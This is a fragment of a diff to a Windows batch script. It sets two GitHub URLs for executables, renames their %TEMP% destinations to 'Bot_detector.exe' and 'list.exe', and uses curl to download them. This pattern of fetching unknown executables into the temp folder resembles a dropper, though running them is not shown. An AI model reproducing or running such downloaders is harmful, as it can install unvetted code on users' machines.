@@ -4,8 +4,8 @@ set U1=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Bot_detector
 set U2=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/list.exe
 
 REM Set temp file paths
-set F1=%TEMP%\Messageboxtest1.exe
-set F2=%TEMP%\Messageboxtest2.exe
+set F1=%TEMP%\Bot_detector.exe
+set F2=%TEMP%\list.exe
 
 REM Download EXE files using curl
 curl -L -o "%F1%" "%U1%"
